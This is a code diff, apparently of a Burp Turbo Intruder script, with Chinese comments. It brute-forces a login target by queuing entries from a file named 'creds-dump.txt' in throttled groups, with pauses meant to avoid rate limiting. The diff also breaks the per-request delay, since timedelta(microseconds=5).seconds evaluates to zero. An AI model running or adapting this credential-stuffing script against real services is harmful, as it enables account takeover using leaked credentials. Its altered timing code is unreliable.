@@ -1,9 +1,10 @@
 import time
+import datetime as dt
 
 """
 间歇暴破
-- 任务派发 `engine.queue` 
-    - 时间控制 time.sleep 
+- 任务派发 `engine.queue`，类似协程/线程的并发模型
+- 时间控制 time.sleep 
 """
 
 def task_data_generator_builder(file_path):
@@ -27,28 +28,26 @@ def queueRequests(target, wordlists):
     # 设置参数
     ## 每组尝试次数
     group_size=10 
-    ## 每组尝试间隔，分/秒
-    group_throttle_min=0
-    group_throttle_sec=33
-    ## 组内每个请求间隔 ms
-    task_throttle=5 
+    ## sleep 单位为秒，设置时间后使用 dt.timedelta.seconds
+    ## 每组尝试间隔
+    group_throttle = dt.timedelta(minutes=0, seconds=33)
+    ## 组内每个请求间隔
+    task_throttle=dt.timedelta(microseconds=5)
     ## 字典路径
     file_path = 'E:/creds-dump.txt'
 
-    # 将每组间隔统一单位到秒
-    group_throttle_total = group_throttle_min*60 + group_throttle_sec
     # 组内任务计数
     cur_group_count=0
     # 循环遍历字典列表
     for task_data in task_data_generator_builder(file_path):
         # 应用组内尝试间隔
-        time.sleep(task_throttle/1000)
+        time.sleep(task_throttle.seconds)
         # 使用请求模板，`%s` 填入当前测试条目
         engine.queue(target.req, task_data)
         cur_group_count += 1
         # 应用每组尝试间隔
         if(cur_group_count == group_size):
-            time.sleep(group_throttle_total)
+            time.sleep(group_throttle.seconds)
             cur_group_count = 0
 
 def handleResponse(req, interesting):
